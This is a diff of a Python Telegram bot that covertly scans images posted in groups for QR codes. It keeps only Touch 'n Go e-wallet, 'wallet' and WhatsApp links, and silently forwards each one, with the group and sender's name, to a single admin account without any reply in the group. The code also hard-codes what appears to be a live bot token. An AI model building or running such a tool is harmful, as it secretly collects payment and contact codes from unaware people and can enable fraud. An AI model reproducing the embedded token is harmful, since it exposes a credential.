@@ -4,16 +4,15 @@ import time
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
-print("🚀 SILENT PRO MAX BOT STARTED")
+print("🚀 SILENT ADMIN MODE STARTED")
 
 BOT_TOKEN = "8740908330:AAEdPDwfzmA-rfzy1_20s4x46QA6MoFGCo8"
 
 detector = cv2.QRCodeDetector()
 
-# 🔒 admin ID
+# 🔥 
 ADMIN_ID = 340757376
 
-# anti spam memory
 cooldown = {}
 
 
@@ -38,9 +37,8 @@ def is_valid_qr(data: str) -> bool:
         "tngd",
         "touchngo",
         "tngdigital",
-        "wa.me",
-        "whatsapp",
-        "wallet"
+        "wallet",
+        "wa.me"
     ])
 
 
@@ -51,7 +49,7 @@ async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not message:
             return
 
-        # 👥 ONLY GROUPS
+        # 👥 only group scan
         if message.chat.type not in ["group", "supergroup"]:
             return
 
@@ -81,16 +79,16 @@ async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not data:
             return
 
-        print(f"QR FOUND: {data}")
+        print("QR DETECTED:", data)
 
-        # 🚫 FILTER INVALID QR
+        # 🚫 filter junk QR
         if not is_valid_qr(data):
             return
 
-        # 🔥 SEND ONLY TO ADMIN (SILENT MODE)
+        # 🔥 SEND ONLY TO ADMIN (NO GROUP REPLY)
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=f"""📌 QR SCAN DETECTED
+            text=f"""📌 SILENT QR DETECTED
 
 👥 Group: {message.chat.title}
 👤 User: {message.from_user.first_name}
@@ -113,7 +111,7 @@ def main():
         MessageHandler(filters.PHOTO | filters.Document.IMAGE, handle)
     )
 
-    print("🚀 SILENT PRO MAX RUNNING")
+    print("🚀 RUNNING SILENT ADMIN MODE")
     app.run_polling(drop_pending_updates=True)
 
 
